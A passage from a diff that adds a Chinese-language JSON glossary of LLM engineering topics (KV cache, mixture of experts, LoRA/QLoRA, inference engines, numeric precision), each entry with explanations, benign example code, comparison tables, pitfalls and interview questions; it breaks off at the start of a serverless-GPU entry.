@@ -1,0 +1,3549 @@
+[
+ {
+  "slug": "kv-cache",
+  "def": "KV 缓存（KV Cache）是 Transformer 自回归推理中的优化：把已处理 token 在每层注意力中计算出的 Key 与 Value 张量保存在显存里，生成新 token 时只为新 token 计算 Q/K/V 并与缓存做注意力，避免对整个前缀重复计算。它属于模型推理层，是解码速度、显存占用与并发能力的核心约束。",
+  "how": [
+   "预填充（Prefill）阶段：并行处理整段输入提示，为每层生成并缓存所有 token 的 K、V。",
+   "解码（Decode）阶段：每步只为最新 token 计算 Q、K、V，把新 K、V 追加进缓存。",
+   "新 token 的 Q 与缓存中全部 K 做点积得到注意力权重，再加权 V，复杂度从重算前缀降为与长度线性相关。",
+   "缓存大小约为 2 × 层数 × KV 头数 × 头维度 × 序列长度 × 批大小 × 每元素字节数，随上下文与并发线性增长。",
+   "推理引擎通过分页管理（PagedAttention）、前缀共享、KV 量化与 GQA 等结构降低缓存占用。"
+  ],
+  "terms": [
+   {
+    "t": "预填充 (Prefill)",
+    "d": "一次性处理输入提示并建立 KV 缓存的阶段，偏计算密集。"
+   },
+   {
+    "t": "解码 (Decode)",
+    "d": "逐 token 生成的阶段，通常受显存带宽限制。"
+   },
+   {
+    "t": "分组查询注意力 (GQA)",
+    "d": "多个查询头共享一组 K/V 头，按比例减小 KV 缓存。"
+   },
+   {
+    "t": "PagedAttention",
+    "d": "vLLM 提出的按块分页管理 KV 缓存的方法，减少显存碎片。"
+   },
+   {
+    "t": "前缀缓存 (Prefix Caching)",
+    "d": "相同提示前缀的 KV 缓存在请求间复用，降低 TTFT。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "估算 KV 缓存显存占用",
+   "src": "def kv_cache_bytes(layers, kv_heads, head_dim, seq_len, batch=1, bytes_per_elem=2):\n    \"\"\"2 代表 K 和 V 两份；bytes_per_elem=2 对应 FP16/BF16\"\"\"\n    return 2 * layers * kv_heads * head_dim * seq_len * batch * bytes_per_elem\n\n# 以 Llama-3-8B 的公开配置为例：32 层、8 个 KV 头（GQA）、头维度 128\ncfg = dict(layers=32, kv_heads=8, head_dim=128)\n\nfor seq in (4_096, 32_768, 131_072):\n    gib = kv_cache_bytes(**cfg, seq_len=seq) / 1024**3\n    print(f\"单请求 {seq:>7} tokens: {gib:.2f} GiB\")\n\n# 若不用 GQA（32 个 KV 头），缓存会是上面的 4 倍\n# 并发 batch 个请求时再乘以 batch\n",
+   "note": "按公式可见：上下文和并发都会线性放大 KV 缓存，GQA 通过减少 KV 头来压缩。"
+  },
+  "table": {
+   "title": "降低 KV 缓存占用的手段",
+   "head": [
+    "手段",
+    "原理",
+    "代价"
+   ],
+   "rows": [
+    [
+     "GQA / MQA",
+     "多个查询头共享 K/V 头",
+     "需在模型架构阶段决定"
+    ],
+    [
+     "PagedAttention",
+     "按块分配，减少碎片浪费",
+     "需引擎支持"
+    ],
+    [
+     "KV 缓存量化（如 FP8）",
+     "降低每元素字节数",
+     "可能轻微影响质量"
+    ],
+    [
+     "前缀缓存",
+     "相同前缀只存一份",
+     "仅对重复前缀有效"
+    ],
+    [
+     "限制最大上下文",
+     "直接限制序列长度",
+     "长文档能力受限"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "为长上下文预留大量 KV 显存",
+    "pros": "支持长文档与长对话",
+    "cons": "并发数下降，单卡吞吐降低",
+    "when": "长文档问答、代码库分析"
+   },
+   {
+    "opt": "限制上下文、提高并发",
+    "pros": "吞吐高、成本低",
+    "cons": "长输入需截断或分段",
+    "when": "短对话客服、分类任务"
+   },
+   {
+    "opt": "KV 缓存量化",
+    "pros": "同显存下容纳更多 token",
+    "cons": "需验证质量影响",
+    "when": "显存紧张的自部署"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "只按模型权重大小估算显存，忘了 KV 缓存",
+    "fix": "按目标上下文长度与并发数计算 KV 缓存并预留余量"
+   },
+   {
+    "bad": "把 max-model-len 设到模型上限却无需求",
+    "fix": "按实际业务长度设置，释放显存给并发"
+   },
+   {
+    "bad": "动态内容放在提示开头，前缀缓存始终失效",
+    "fix": "固定内容（系统提示、工具定义）放前面，变化部分放后面"
+   },
+   {
+    "bad": "以为 KV 缓存能跨会话长期记忆",
+    "fix": "它只服务于单次推理序列，持久记忆需另行存储"
+   }
+  ],
+  "checklist": [
+   "按上下文×并发估算 KV 显存",
+   "推理引擎已开启前缀缓存（如支持）",
+   "提示结构固定部分在前",
+   "监控 KV 缓存使用率与抢占次数",
+   "最大上下文按业务需求设定"
+  ],
+  "interview": [
+   {
+    "q": "为什么解码阶段通常受显存带宽限制？",
+    "a": "每生成一个 token 都要读取全部模型权重和该序列的 KV 缓存，而计算量相对较小，算术强度低，瓶颈在从显存搬运数据的速度，而不是算力。"
+   },
+   {
+    "q": "GQA 如何减少 KV 缓存？",
+    "a": "标准多头注意力每个查询头都有独立 K/V；GQA 让一组查询头共享一对 K/V 头，KV 头数减少为原来的若干分之一，缓存按相同比例缩小，质量通常接近多头注意力。"
+   },
+   {
+    "q": "提示缓存（Prompt Caching）和 KV 缓存什么关系？",
+    "a": "API 厂商的提示缓存本质是在请求之间复用相同前缀的 KV 缓存，跳过这部分预填充，从而降低延迟和输入费用。前缀必须完全一致才能命中。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "vLLM 论文：Efficient Memory Management for LLM Serving with PagedAttention",
+    "url": "https://arxiv.org/abs/2309.06180"
+   },
+   {
+    "title": "Hugging Face 文档：KV cache strategies",
+    "url": "https://huggingface.co/docs/transformers/kv_cache"
+   },
+   {
+    "title": "GQA 论文 (arXiv 2305.13245)",
+    "url": "https://arxiv.org/abs/2305.13245"
+   }
+  ]
+ },
+ {
+  "slug": "mixture-of-experts",
+  "def": "混合专家模型（Mixture of Experts，MoE）是一种稀疏激活的神经网络架构：把 Transformer 中的前馈层（FFN）替换为多个并列的「专家」子网络，由路由器为每个 token 选择少数几个专家参与计算。它属于模型架构层，使总参数量可以很大，而每个 token 的计算量只取决于激活参数，Mixtral、DeepSeek-V3 等开源模型均采用此架构。",
+  "how": [
+   "每个 MoE 层包含路由器（门控网络）和 N 个专家 FFN，注意力层通常仍是共享的稠密结构。",
+   "路由器为每个 token 计算对各专家的打分，选取 Top-k（常见 k=1 或 2，也有更细粒度设计）专家。",
+   "token 只送入被选中的专家，输出按门控权重加权求和；未选中的专家不参与该 token 的计算。",
+   "训练时加入负载均衡损失或其他均衡策略，防止路由集中在少数专家导致其他专家闲置。",
+   "推理时全部专家权重都需加载进显存（或分布到多卡），因此显存按总参数计、计算按激活参数计。"
+  ],
+  "terms": [
+   {
+    "t": "专家 (Expert)",
+    "d": "MoE 层中的一个独立前馈子网络。"
+   },
+   {
+    "t": "路由器 / 门控 (Router / Gating)",
+    "d": "为每个 token 选择专家并给出权重的小网络。"
+   },
+   {
+    "t": "Top-k 路由",
+    "d": "每个 token 只激活得分最高的 k 个专家。"
+   },
+   {
+    "t": "激活参数 (Active Parameters)",
+    "d": "处理单个 token 实际参与计算的参数量。"
+   },
+   {
+    "t": "专家并行 (Expert Parallelism)",
+    "d": "把不同专家放在不同 GPU 上的并行方式，需要 all-to-all 通信。"
+   },
+   {
+    "t": "负载均衡损失 (Load Balancing Loss)",
+    "d": "鼓励 token 均匀分布到各专家的辅助训练目标。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "Top-2 路由的最小实现",
+   "src": "import torch, torch.nn as nn, torch.nn.functional as F\n\nclass MoE(nn.Module):\n    def __init__(self, dim=512, n_experts=8, k=2):\n        super().__init__()\n        self.k = k\n        self.router = nn.Linear(dim, n_experts)\n        self.experts = nn.ModuleList(\n            nn.Sequential(nn.Linear(dim, 4 * dim), nn.GELU(), nn.Linear(4 * dim, dim))\n            for _ in range(n_experts))\n\n    def forward(self, x):                      # x: [tokens, dim]\n        logits = self.router(x)                # 每个 token 对每个专家打分\n        w, idx = logits.topk(self.k, dim=-1)   # 选 Top-k 专家\n        w = F.softmax(w, dim=-1)\n        out = torch.zeros_like(x)\n        for slot in range(self.k):\n            for e in idx[:, slot].unique():\n                mask = idx[:, slot] == e       # 只把相关 token 送进该专家\n                out[mask] += w[mask, slot, None] * self.experts[e](x[mask])\n        return out\n\nprint(MoE()(torch.randn(10, 512)).shape)       # torch.Size([10, 512])",
+   "note": "教学示例：8 个专家只算 2 个；生产实现还需负载均衡损失、容量限制与高效分发内核。"
+  },
+  "table": {
+   "title": "公开 MoE 模型示例（据官方发布）",
+   "head": [
+    "模型",
+    "总参数",
+    "激活参数",
+    "路由"
+   ],
+   "rows": [
+    [
+     "Mixtral 8x7B",
+     "约 47B",
+     "约 13B",
+     "8 专家选 2"
+    ],
+    [
+     "DeepSeek-V3",
+     "671B",
+     "37B",
+     "细粒度专家 + 共享专家"
+    ],
+    [
+     "Switch Transformer",
+     "最高万亿级",
+     "随配置而定",
+     "Top-1 路由"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "MoE 模型",
+    "pros": "同等计算量下容量更大，训练与推理 FLOPs 低",
+    "cons": "显存需装下全部专家，通信复杂",
+    "when": "大规模服务、多卡部署"
+   },
+   {
+    "opt": "稠密模型",
+    "pros": "结构简单、部署与微调生态成熟",
+    "cons": "参数增大则每 token 计算同步增大",
+    "when": "单卡或边缘部署"
+   },
+   {
+    "opt": "MoE 量化部署",
+    "pros": "降低全部专家的显存占用",
+    "cons": "质量与路由稳定性需验证",
+    "when": "显存受限但想用大 MoE"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "按激活参数估算部署显存",
+    "fix": "显存按总参数估算，激活参数决定的是计算量与速度"
+   },
+   {
+    "bad": "小批量单卡推理期望达到宣传的高吞吐",
+    "fix": "MoE 优势在大批量、专家并行；小批量时访存不一定省"
+   },
+   {
+    "bad": "微调时不处理路由，导致专家塌缩",
+    "fix": "保留负载均衡机制，或冻结路由器只调专家/注意力"
+   },
+   {
+    "bad": "忽视专家并行的跨卡通信开销",
+    "fix": "评估 all-to-all 带宽，优先使用高速互联"
+   }
+  ],
+  "checklist": [
+   "显存预算按总参数（含量化）计算",
+   "推理引擎支持该 MoE 架构",
+   "评估批量大小对吞吐的影响",
+   "多卡部署确认互联带宽",
+   "微调方案考虑路由稳定性"
+  ],
+  "interview": [
+   {
+    "q": "MoE 为什么能「大参数、低成本」？",
+    "a": "每个 token 只经过少数专家，计算量由激活参数决定；总参数提供更大的知识容量。代价是显存要装下全部参数，以及路由与通信带来的工程复杂度。"
+   },
+   {
+    "q": "负载不均衡会造成什么问题？",
+    "a": "少数专家过载、其他专家很少被训练，模型容量被浪费；分布式时热门专家所在 GPU 成为瓶颈或触发 token 丢弃。通过辅助损失、容量因子或无辅助损失的偏置调整来均衡。"
+   },
+   {
+    "q": "MoE 中「专家」真的按领域分工吗？",
+    "a": "不一定。研究观察到路由更多与 token 层面的模式（语法、符号类型）相关，而非人类意义上的学科领域。「专家」是结构名称，不应理解为数学专家、代码专家。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "Hugging Face Blog：Mixture of Experts Explained",
+    "url": "https://huggingface.co/blog/moe"
+   },
+   {
+    "title": "Mixtral of Experts (arXiv 2401.04088)",
+    "url": "https://arxiv.org/abs/2401.04088"
+   },
+   {
+    "title": "Switch Transformers (arXiv 2101.03961)",
+    "url": "https://arxiv.org/abs/2101.03961"
+   },
+   {
+    "title": "DeepSeek-V3 Technical Report (arXiv 2412.19437)",
+    "url": "https://arxiv.org/abs/2412.19437"
+   }
+  ]
+ },
+ {
+  "slug": "lora",
+  "def": "LoRA（Low-Rank Adaptation，低秩适配）是一种参数高效微调（PEFT）方法：冻结预训练权重 W，在选定线性层旁注入两个低秩矩阵 A、B，只训练它们，使权重更新 ΔW = BA 的秩远小于原矩阵。QLoRA 进一步把冻结的基座以 4-bit 量化加载，在其上训练 LoRA，显著降低显存。它属于模型训练与适配层。",
+  "how": [
+   "选择目标模块（常见为注意力的 q/k/v/o 投影，或加上 MLP 层），冻结全部原始参数。",
+   "为每个目标线性层添加 A（r×d）与 B（d×r），r 为秩（常见 8–64）；B 初始化为零，使训练开始时输出不变。",
+   "前向时输出为 Wx + (α/r)·BAx，α 为缩放系数；反向传播只更新 A、B，优化器状态也只为它们保存。",
+   "QLoRA 把基座权重量化为 4-bit NF4，计算时反量化到 BF16，并配合双重量化与分页优化器节省显存。",
+   "训练后可单独保存适配器（通常几十 MB 级），推理时动态加载，或合并回基座权重消除额外延迟。"
+  ],
+  "terms": [
+   {
+    "t": "秩 (Rank, r)",
+    "d": "低秩矩阵的内维度，决定适配器容量与参数量。"
+   },
+   {
+    "t": "lora_alpha",
+    "d": "缩放系数，实际缩放为 α/r，影响更新幅度。"
+   },
+   {
+    "t": "目标模块 (target_modules)",
+    "d": "被注入 LoRA 的层名，如 q_proj、v_proj。"
+   },
+   {
+    "t": "NF4 (4-bit NormalFloat)",
+    "d": "QLoRA 提出的 4-bit 数据类型，针对正态分布权重设计。"
+   },
+   {
+    "t": "PEFT",
+    "d": "参数高效微调方法族，也是 Hugging Face 对应库的名称。"
+   },
+   {
+    "t": "权重合并 (Merge)",
+    "d": "把 BA 加回 W，得到无额外推理开销的完整模型。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "PEFT 配置 QLoRA",
+   "src": "import torch\nfrom transformers import AutoModelForCausalLM, BitsAndBytesConfig\nfrom peft import LoraConfig, get_peft_model, prepare_model_for_kbit_training\n\nbnb = BitsAndBytesConfig(load_in_4bit=True, bnb_4bit_quant_type=\"nf4\",\n                         bnb_4bit_compute_dtype=torch.bfloat16,\n                         bnb_4bit_use_double_quant=True)\nmodel = AutoModelForCausalLM.from_pretrained(\n    \"Qwen/Qwen2.5-1.5B-Instruct\", quantization_config=bnb, device_map=\"auto\")\nmodel = prepare_model_for_kbit_training(model)   # 4-bit 基座冻结\n\nconfig = LoraConfig(\n    r=16, lora_alpha=32, lora_dropout=0.05,\n    target_modules=[\"q_proj\", \"k_proj\", \"v_proj\", \"o_proj\"],\n    task_type=\"CAUSAL_LM\")\nmodel = get_peft_model(model, config)\nmodel.print_trainable_parameters()   # 可训练参数通常只占总量很小比例\n# 之后交给 transformers Trainer 或 TRL 的 SFTTrainer 训练\n# model.save_pretrained(\"my-adapter\") 只保存适配器权重",
+   "note": "基座以 4-bit 加载并冻结，只训练注意力投影上的 LoRA 矩阵；需 GPU 与 bitsandbytes。"
+  },
+  "table": {
+   "title": "微调方式对比",
+   "head": [
+    "方式",
+    "训练参数",
+    "显存需求",
+    "产物"
+   ],
+   "rows": [
+    [
+     "全量微调",
+     "全部",
+     "最高（含优化器状态）",
+     "完整模型"
+    ],
+    [
+     "LoRA",
+     "极少（低秩矩阵）",
+     "需装下 16 位基座",
+     "适配器文件"
+    ],
+    [
+     "QLoRA",
+     "同 LoRA",
+     "基座 4-bit，显著更低",
+     "适配器文件"
+    ],
+    [
+     "提示工程/RAG",
+     "无",
+     "仅推理",
+     "提示或知识库"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "LoRA",
+    "pros": "显存低、训练快、适配器可热切换",
+    "cons": "容量有限，复杂新知识效果不如全量",
+    "when": "风格、格式、领域语气适配"
+   },
+   {
+    "opt": "QLoRA",
+    "pros": "单卡可微调较大模型",
+    "cons": "量化带来额外计算与轻微误差",
+    "when": "显存紧张的个人/小团队"
+   },
+   {
+    "opt": "全量微调",
+    "pros": "表达能力最强",
+    "cons": "成本高，易灾难性遗忘",
+    "when": "大量数据、深度领域迁移"
+   },
+   {
+    "opt": "不微调（RAG/提示）",
+    "pros": "无训练成本，知识可实时更新",
+    "cons": "无法改变模型行为习惯",
+    "when": "知识问答类需求"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "用微调灌输事实知识，期望模型准确记住",
+    "fix": "事实知识用 RAG；微调更适合行为、格式和风格"
+   },
+   {
+    "bad": "小数据集训练过多轮导致过拟合",
+    "fix": "留验证集，监控验证损失，早停或减少轮次"
+   },
+   {
+    "bad": "训练与推理使用不同的对话模板",
+    "fix": "训练数据套用与推理一致的 chat template"
+   },
+   {
+    "bad": "合并到 4-bit 量化基座后精度异常",
+    "fix": "合并时在 16 位精度的基座上进行，再按需量化"
+   }
+  ],
+  "checklist": [
+   "明确微调目标属于行为/格式类",
+   "训练与验证数据集分离",
+   "对话模板与推理一致",
+   "与基座模型做对照评测",
+   "检查基座模型许可证允许微调与分发"
+  ],
+  "interview": [
+   {
+    "q": "LoRA 为什么有效？",
+    "a": "论文假设微调时权重更新具有低「内在秩」，用低秩矩阵即可近似；冻结基座也减少优化器状态和梯度显存。实验表明在多种任务上接近全量微调效果。"
+   },
+   {
+    "q": "秩 r 和 alpha 如何选？",
+    "a": "r 越大容量越高、参数越多；常从 8 或 16 起步。缩放为 α/r，常见做法是 α 设为 r 的 1–2 倍。最终以验证集效果为准，并配合学习率一起调。"
+   },
+   {
+    "q": "QLoRA 节省显存的三个关键技术？",
+    "a": "4-bit NF4 量化基座权重；双重量化（对量化常数再量化）；分页优化器在显存峰值时把优化器状态换出到 CPU 内存。论文据此在单张 48GB GPU 上微调了 65B 模型。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "LoRA (arXiv 2106.09685)",
+    "url": "https://arxiv.org/abs/2106.09685"
+   },
+   {
+    "title": "QLoRA (arXiv 2305.14314)",
+    "url": "https://arxiv.org/abs/2305.14314"
+   },
+   {
+    "title": "Hugging Face PEFT 文档",
+    "url": "https://huggingface.co/docs/peft/index"
+   }
+  ]
+ },
+ {
+  "slug": "inference-engines",
+  "def": "推理引擎（Inference Engine）是专门执行大模型推理的服务软件，负责加载权重、调度请求、管理 KV 缓存并调用优化内核，对外暴露 HTTP/OpenAI 兼容接口。它属于模型服务层，决定自部署模型的吞吐、延迟与成本。vLLM、SGLang 面向 GPU 服务器的高并发服务，llama.cpp 面向 CPU/消费级硬件与 GGUF 量化模型。",
+  "how": [
+   "加载模型权重（可选量化格式）到 GPU/CPU 内存，并预留显存给 KV 缓存。",
+   "请求进入调度器，连续批处理（continuous batching）在每个解码步动态加入新请求、移出已完成请求。",
+   "KV 缓存按块管理（如 PagedAttention），支持前缀共享，减少碎片，提高可容纳的并发数。",
+   "调用融合注意力、量化矩阵乘等优化内核，并可启用张量并行、投机解码、结构化输出等特性。",
+   "通过 OpenAI 兼容 API 流式返回 token，同时暴露吞吐、排队、缓存使用率等监控指标。"
+  ],
+  "terms": [
+   {
+    "t": "连续批处理 (Continuous Batching)",
+    "d": "以解码步为粒度动态组批，避免等待整批完成。"
+   },
+   {
+    "t": "PagedAttention",
+    "d": "vLLM 的分页 KV 缓存管理机制。"
+   },
+   {
+    "t": "RadixAttention",
+    "d": "SGLang 用基数树管理并复用 KV 缓存前缀的机制。"
+   },
+   {
+    "t": "GGUF",
+    "d": "llama.cpp 使用的模型文件格式，支持多种量化等级。"
+   },
+   {
+    "t": "张量并行 (Tensor Parallelism)",
+    "d": "把单层权重切分到多张 GPU 上并行计算。"
+   }
+  ],
+  "code": {
+   "lang": "bash",
+   "title": "三种引擎的启动方式",
+   "src": "# vLLM：启动 OpenAI 兼容服务（默认端口 8000）\nvllm serve Qwen/Qwen2.5-7B-Instruct \\\n  --max-model-len 8192 \\\n  --gpu-memory-utilization 0.90\n\n# SGLang：启动服务（默认端口 30000）\npython -m sglang.launch_server \\\n  --model-path Qwen/Qwen2.5-7B-Instruct --port 30000\n\n# llama.cpp：用 GGUF 量化模型在 CPU/消费级 GPU 上运行\nllama-server -m ./qwen2.5-7b-instruct-q4_k_m.gguf -c 4096 --port 8080\n\n# 三者都可用 OpenAI 风格接口调用\ncurl http://localhost:8000/v1/chat/completions \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"model\":\"Qwen/Qwen2.5-7B-Instruct\",\"messages\":[{\"role\":\"user\",\"content\":\"你好\"}]}'",
+   "note": "按需替换模型名与路径；--gpu-memory-utilization 决定留给权重和 KV 缓存的显存比例。"
+  },
+  "table": {
+   "title": "主流推理引擎对比",
+   "head": [
+    "引擎",
+    "主要硬件",
+    "特点",
+    "典型场景"
+   ],
+   "rows": [
+    [
+     "vLLM",
+     "NVIDIA/AMD GPU 等",
+     "PagedAttention、生态广",
+     "生产 API 服务"
+    ],
+    [
+     "SGLang",
+     "GPU",
+     "RadixAttention、结构化生成快",
+     "Agent、多轮复杂调用"
+    ],
+    [
+     "llama.cpp",
+     "CPU、Apple Silicon、消费级 GPU",
+     "GGUF 量化、依赖少",
+     "本地与边缘部署"
+    ],
+    [
+     "TensorRT-LLM",
+     "NVIDIA GPU",
+     "深度内核优化，需构建引擎",
+     "追求极致性能"
+    ],
+    [
+     "Ollama",
+     "同 llama.cpp 体系",
+     "一键拉取运行，体验简单",
+     "个人开发与试用"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "自部署推理引擎",
+    "pros": "数据不出域、可定制、量大时单价低",
+    "cons": "需运维 GPU 与容量规划",
+    "when": "隐私要求高或调用量大"
+   },
+   {
+    "opt": "托管模型 API",
+    "pros": "零运维、模型能力强",
+    "cons": "按 Token 付费，数据出域",
+    "when": "通用任务、起步阶段"
+   },
+   {
+    "opt": "本地 llama.cpp/Ollama",
+    "pros": "离线、免费、隐私",
+    "cons": "并发和速度有限",
+    "when": "个人工具与原型"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "用 transformers 的 generate 循环直接对外服务",
+    "fix": "生产服务使用支持连续批处理的推理引擎"
+   },
+   {
+    "bad": "把 gpu-memory-utilization 设满且同卡运行其他程序",
+    "fix": "为其他进程预留显存，避免 OOM"
+   },
+   {
+    "bad": "只测单请求延迟就评估容量",
+    "fix": "按目标并发压测吞吐、TTFT 与 TPOT 分位数"
+   },
+   {
+    "bad": "对外暴露推理端口而无鉴权",
+    "fix": "放在网关之后，加 API Key 与限流"
+   }
+  ],
+  "checklist": [
+   "引擎版本支持目标模型架构",
+   "最大上下文与显存比例按需求设置",
+   "压测过目标并发下的 TTFT/TPOT",
+   "接口有鉴权与限流",
+   "监控排队长度与 KV 缓存使用率"
+  ],
+  "interview": [
+   {
+    "q": "为什么推理引擎比朴素 generate 快很多？",
+    "a": "朴素实现静态组批、显存预分配浪费；引擎用连续批处理提高 GPU 利用率，分页 KV 缓存提升并发，配合融合内核、前缀缓存与 CUDA Graph 等优化，在并发场景下吞吐显著更高。"
+   },
+   {
+    "q": "vLLM 和 llama.cpp 如何选择？",
+    "a": "多用户、GPU 服务器、追求吞吐选 vLLM/SGLang；单用户、CPU/Mac/消费级显卡、需要低比特量化与离线运行选 llama.cpp（或基于它的 Ollama）。"
+   },
+   {
+    "q": "TTFT 和 TPOT 分别受什么影响？",
+    "a": "TTFT 主要受排队与预填充（输入长度、前缀缓存命中）影响；TPOT 受解码阶段的显存带宽、批大小与模型大小影响。批越大吞吐越高，但单请求 TPOT 可能变差。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "vLLM 文档",
+    "url": "https://docs.vllm.ai/en/latest/"
+   },
+   {
+    "title": "SGLang 文档",
+    "url": "https://docs.sglang.io/"
+   },
+   {
+    "title": "llama.cpp (GitHub)",
+    "url": "https://github.com/ggml-org/llama.cpp"
+   }
+  ]
+ },
+ {
+  "slug": "numeric-precision",
+  "def": "数值精度（Numeric Precision）指模型权重、激活和梯度用何种数据格式表示，如 FP32、FP16、BF16、FP8 及整数格式。它属于训练与推理的数值计算层，直接决定显存占用（每参数 4/2/1 字节）、计算吞吐（新硬件对低精度有专用 Tensor Core 加速）和数值稳定性。混合精度训练与低精度推理是当前主流。",
+  "how": [
+   "浮点数由符号位、指数位和尾数位组成：指数位决定可表示的范围，尾数位决定精度。",
+   "FP16（1-5-10）精度较高但范围小，训练时需损失缩放防止梯度下溢；BF16（1-8-7）与 FP32 范围相同，精度较低，更稳定。",
+   "FP8 有 E4M3（精度优先）与 E5M2（范围优先）两种格式，需配合缩放因子，并需 Hopper、Ada 等较新架构的硬件支持。",
+   "混合精度训练用低精度做前向与反向计算，保留 FP32 主权重与累加，兼顾速度与稳定性。",
+   "推理时常以 BF16/FP16 加载，进一步用 FP8 或 INT8/INT4 量化以降低显存与带宽需求。"
+  ],
+  "terms": [
+   {
+    "t": "指数位 / 尾数位 (Exponent / Mantissa)",
+    "d": "分别决定数值范围和有效精度。"
+   },
+   {
+    "t": "BF16 (bfloat16)",
+    "d": "保留 FP32 的 8 位指数，尾数 7 位，训练稳定。"
+   },
+   {
+    "t": "FP8 (E4M3 / E5M2)",
+    "d": "8 位浮点格式，需缩放因子，用于训练与推理加速。"
+   },
+   {
+    "t": "混合精度 (Mixed Precision)",
+    "d": "低精度计算 + 高精度主权重/累加的组合方案。"
+   },
+   {
+    "t": "损失缩放 (Loss Scaling)",
+    "d": "放大损失以避免 FP16 梯度下溢，再缩回更新。"
+   },
+   {
+    "t": "TF32",
+    "d": "NVIDIA Ampere 起的矩阵运算格式，FP32 范围、10 位尾数。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "PyTorch 混合精度与显存估算",
+   "src": "import torch\n\n# 各精度每个元素的字节数\nfor dt in (torch.float32, torch.float16, torch.bfloat16):\n    print(dt, torch.tensor([], dtype=dt).element_size(), \"bytes\")\n\n# 7B 参数模型仅权重所需显存（不含 KV 缓存与激活）\nparams = 7e9\nfor name, b in {\"FP32\": 4, \"BF16\": 2, \"FP8/INT8\": 1, \"INT4\": 0.5}.items():\n    print(f\"{name:8s} ≈ {params * b / 1024**3:.1f} GiB\")\n\n# 混合精度训练：autocast 内用 BF16 计算，参数仍为 FP32\nmodel = torch.nn.Linear(1024, 1024).cuda()\nopt = torch.optim.AdamW(model.parameters())\nx = torch.randn(8, 1024, device=\"cuda\")\nwith torch.autocast(device_type=\"cuda\", dtype=torch.bfloat16):\n    loss = model(x).float().pow(2).mean()\nloss.backward()   # BF16 范围与 FP32 相同，通常无需 GradScaler\nopt.step()",
+   "note": "权重显存与字节数成正比；BF16 autocast 是常用的混合精度方式（需支持 BF16 的 GPU）。"
+  },
+  "table": {
+   "title": "常见数值格式",
+   "head": [
+    "格式",
+    "位布局 (符号-指数-尾数)",
+    "字节",
+    "主要用途"
+   ],
+   "rows": [
+    [
+     "FP32",
+     "1-8-23",
+     "4",
+     "主权重、累加、传统训练"
+    ],
+    [
+     "FP16",
+     "1-5-10",
+     "2",
+     "推理、需损失缩放的训练"
+    ],
+    [
+     "BF16",
+     "1-8-7",
+     "2",
+     "主流训练与推理"
+    ],
+    [
+     "FP8 E4M3 / E5M2",
+     "1-4-3 / 1-5-2",
+     "1",
+     "新架构训练与推理加速"
+    ],
+    [
+     "INT8 / INT4",
+     "整数 + 缩放因子",
+     "1 / 0.5",
+     "量化推理"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "BF16",
+    "pros": "稳定、无需损失缩放、生态成熟",
+    "cons": "精度低于 FP16，老 GPU 不支持",
+    "when": "Ampere 及更新 GPU 的训练与推理"
+   },
+   {
+    "opt": "FP16",
+    "pros": "旧硬件广泛支持",
+    "cons": "范围小，易溢出，训练需损失缩放",
+    "when": "不支持 BF16 的设备"
+   },
+   {
+    "opt": "FP8",
+    "pros": "吞吐更高、显存减半（相对 BF16）",
+    "cons": "需硬件支持与缩放校准",
+    "when": "Hopper/Ada 及更新硬件的大规模部署"
+   },
+   {
+    "opt": "INT4 等低比特量化",
+    "pros": "显存最小，可在消费级设备运行",
+    "cons": "质量损失需评估",
+    "when": "本地与边缘推理"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "在不支持 BF16 的 GPU 上强行使用 BF16",
+    "fix": "先确认硬件能力（torch.cuda.is_bf16_supported()），否则用 FP16"
+   },
+   {
+    "bad": "FP16 训练不做损失缩放，梯度变成 0 或 NaN",
+    "fix": "使用 GradScaler 等动态损失缩放"
+   },
+   {
+    "bad": "把累加和归一化也放在低精度",
+    "fix": "softmax、LayerNorm、累加保持 FP32，框架 autocast 通常会处理"
+   },
+   {
+    "bad": "只按权重估显存，忽略优化器状态",
+    "fix": "训练时 AdamW 状态和主权重通常是权重显存的数倍"
+   }
+  ],
+  "checklist": [
+   "确认硬件支持的精度格式",
+   "推理精度与模型发布精度一致或经评测",
+   "训练使用混合精度并保留 FP32 主权重",
+   "低精度切换后跑基准评测",
+   "显存估算包含 KV 缓存与激活"
+  ],
+  "interview": [
+   {
+    "q": "BF16 为什么比 FP16 更适合训练？",
+    "a": "BF16 与 FP32 指数位相同，可表示范围一致，梯度和激活不易溢出或下溢，通常无需损失缩放；虽然尾数精度更低，但深度学习对此较不敏感。"
+   },
+   {
+    "q": "FP8 训练的关键难点？",
+    "a": "动态范围和精度都很有限，需要按张量或按块的缩放因子，并在前向用 E4M3、反向梯度常用 E5M2；敏感算子保持高精度，并依赖硬件 Tensor Core 支持。"
+   },
+   {
+    "q": "精度和量化是一回事吗？",
+    "a": "相关但不同。精度指数据格式；量化通常指把高精度权重映射到低比特（尤其整数）表示并配合缩放因子，是降低精度的一类具体方法，常伴随校准过程。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "PyTorch 文档：Automatic Mixed Precision",
+    "url": "https://docs.pytorch.org/docs/stable/amp.html"
+   },
+   {
+    "title": "FP8 Formats for Deep Learning (arXiv 2209.05433)",
+    "url": "https://arxiv.org/abs/2209.05433"
+   },
+   {
+    "title": "Wikipedia: bfloat16 floating-point format",
+    "url": "https://en.wikipedia.org/wiki/Bfloat16_floating-point_format"
+   }
+  ]
+ },
+ {
+  "slug": "serverless-gpu",
